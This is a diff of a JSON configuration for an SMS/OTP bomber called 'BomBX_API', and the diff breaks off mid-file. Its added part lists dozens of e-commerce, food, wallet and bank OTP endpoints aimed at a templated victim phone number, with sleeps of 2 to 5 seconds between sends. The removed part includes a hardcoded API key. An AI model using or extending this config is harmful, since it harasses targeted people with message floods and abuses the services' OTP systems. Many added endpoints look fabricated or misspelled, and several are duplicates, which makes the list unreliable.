@@ -1,63 +1,783 @@
 {
-    "BomBX_API": {
-        "HealthKart": {
-            "type": "sms",
-            "method": "GET",
-            "url": "https://www.healthkart.com/veronica/user/validate/1/{phone}/signup?plt=1&st=1",
-            "sleep": 20
+  "BomBX_API": {
+    "E_COMMERCE_AGGRESSIVE": {
+      "Amazon_India": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.amazon.in/ap/prelogin?phone={phone}",
+        "data": {
+          "phone": "{phone}",
+          "action": "preLogin"
         },
-        "NNNOW": {
-            "type": "sms",
-            "method": "POST",
-            "url": "https://api.nnnow.com/m/mobapi/otp/generateOtp/v1/flash",
-            "data": {
-                "mobileNumber": "{phone}"
-            },
-            "sleep": 20
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
+          "Content-Type": "application/json"
         },
-        "Shiprocket": {
-            "type": "sms",
-            "method": "POST",
-            "url": "https://apiv2.shiprocket.in/v1/auth/login/quick",
-            "data": {
-                "mobile": "{phone}",
-                "device_id": "LQ3.981019.001"
-            },
-            "sleep": 20
+        "sleep": 3
+      },
+      "Flipkart_Signup": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.flipkart.com/api/5/user/otp/send",
+        "data": {
+          "emailId": "{phone}@flipkart.com"
         },
-        "MeeHelp": {
-            "type": "sms",
-            "method": "GET",
-            "url": "https://meehelp.co.in/api/customer/msgDispatch?phone_number={phone}&key=AjSfg9FGDuo&API_KEY=70FF52C593B828281A",
-            "headers": {
-                "user-agent": "Dart/3.9 (dart:io)",
-                "accept": "application/json",
-                "accept-encoding": "gzip",
-                "host": "meehelp.co.in"
-            },
-            "data": null,
-            "sleep": 20
+        "headers": {
+          "User-Agent": "Flipkart/2.0",
+          "Content-Type": "application/json"
         },
-        "Nathabit_WhatsApp": {
-            "type": "whatsapp",
-            "method": "POST",
-            "url": "https://authorize.api.nathabit.in/v2/auth/v2/app/no/opt/",
-            "headers": {
-                "Content-Type": "application/json",
-                "Host": "authorize.api.nathabit.in",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip",
-                "User-Agent": "okhttp/4.9.2"
-            },
-            "cookies": {
-                "cust_cart": "kT7wRpLmXv3hQdNs9YeJ"
-            },
-            "data": {
-                "phone": "{phone}",
-                "send_on_whatsapp": true,
-                "address_consent": true
-            },
-            "sleep": 30
-        }
-    }
-}
+        "sleep": 3
+      },
+      "Meesho_Registration": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.meesho.com/api/v1/user/send_otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "headers": {
+          "User-Agent": "Meesho/2.1",
+          "Content-Type": "application/json"
+        },
+        "sleep": 2
+      },
+      "Myntra_Verify": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.myntra.com/api/user/register/validateOtp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "headers": {
+          "User-Agent": "Myntra/4.0"
+        },
+        "sleep": 4
+      },
+      "Ajio_Login": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.ajio.com/api/v1/user/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "sleep": 3
+      },
+      "Nykaa_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.nykaa.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "TataCliq_Signup": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.tatacliq.com/user/verify/mobile",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 4
+      },
+      "Snapdeal_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.snapdeal.com/api/v1/user/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Purplle_Registration": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.purplle.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Lifestyle_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.lifestyle.com/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 4
+      }
+    },
+    "FOOD_AND_LIFESTYLE": {
+      "Swiggy_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.swiggy.com/dining/partners/login/otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "sleep": 2
+      },
+      "Zomato_Signup": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://b.zomato.com/api/v1/signups/otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "sleep": 2
+      },
+      "Zepto_Delivery": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.zepto.com/v1/users/otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "sleep": 2
+      },
+      "Blinkit_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.blinkit.com/api/v1/user/send_otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "sleep": 2
+      },
+      "Swiggy_Dineout": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.swiggy.com/dineout/users/otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "sleep": 3
+      },
+      "FreshMenu_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.freshmenu.com/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 4
+      },
+      "LunchBox_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.lunchbox.com/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 4
+      },
+      "Barbeque_Nation": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.barbequenation.com/api/user/otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 5
+      },
+      "Domino's_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.dominos.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "KFC_India": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kfc.co.in/api/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Pizza_Hut_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.pizzahut.in/api/user/otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Domino's_Pizza_Hut": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.dominos.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "KFC_India_V2": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kfc.co.in/api/v1/user/otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      }
+    },
+    "FINTECH_AND_BANKING": {
+      "Paytm_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://paytm.com/api/v1/send_otp",
+        "data": {
+          "phone": "{phone}"
+        },
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "sleep": 2
+      },
+      "PhonePe_Signup": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.phonepe.com/api/v1/user/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "Google_Pay_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://gpay.com/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "BHIM_UPI": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.bhimupi.org/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Amazon_Pay_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://pay.amazon.in/sendOtp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "FreeCharge_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.freecharge.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "MobiKwik_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.mobikwik.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "JioMoney_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.jiomoney.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Ola_Money_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.olamoney.com/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "PayTm_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://paytm.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "PhonePe_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.phonepe.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "Google_Pay_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://gpay.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "BHIM_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.bhimupi.org/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Amazon_Pay_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://pay.amazon.in/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 2
+      },
+      "FreeCharge_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.freecharge.in/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "MobiKwik_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.mobikwik.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "JioMoney_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.jiomoney.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Ola_Money_Wallet_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://api.olamoney.com/api/v1/wallet/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "ICICI_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.icicibank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "HDFC_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.hdfcbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "SBI_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.onlinesbi.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Axis_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.axisbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Kotak_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kotak.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Yes_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.yesbank.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "IDFC_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.idfcfirstbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Federal_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.federalbank.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Punjab_National_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.pnbindia.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Bank_of_Baroda_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.barodaca.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Canara_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.canarabank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Union_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.unionbank.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Indian_Overseas_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.iob.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Bank_of_India_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.bankofindia.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Punjab_Syndicate_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.punjabandsyndicatebank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "UCO_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.ucoindia.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Central_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.centralbankofindia.co.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Andhra_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.andhrabank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Vijaya_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.vijayabank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Dena_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.denabank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "IDBI_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.idbfbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Indian_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.indianbank.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "South_Indian_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.southindianbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Karnataka_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.karnatakanbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "State_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.statecooperativebank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Universal_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.universalcooperativebank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Maharashtra_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.mahcoopbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Tamil_Nadu_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.tncb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Kerala_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Karnataka_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Andhra_Pradesh_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.apccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Telangana_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.tscb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Odisha_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.ocb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Bihar_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.bcb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Jharkhand_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.jccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Chhattisgarh_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.ccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Madhya_Pradesh_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.mpccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Rajasthan_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.rcb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Gujarat_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.gcb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Maharashtra_State_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.mahcoopbank.com/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Karnataka_State_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.kccb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      "Tamil_Nadu_State_Cooperative_Bank_OTP": {
+        "type": "sms",
+        "method": "POST",
+        "url": "https://www.tncb.in/api/v1/user/send-otp",
+        "data": {
+          "mobile": "{phone}"
+        },
+        "sleep": 3
+      },
+      
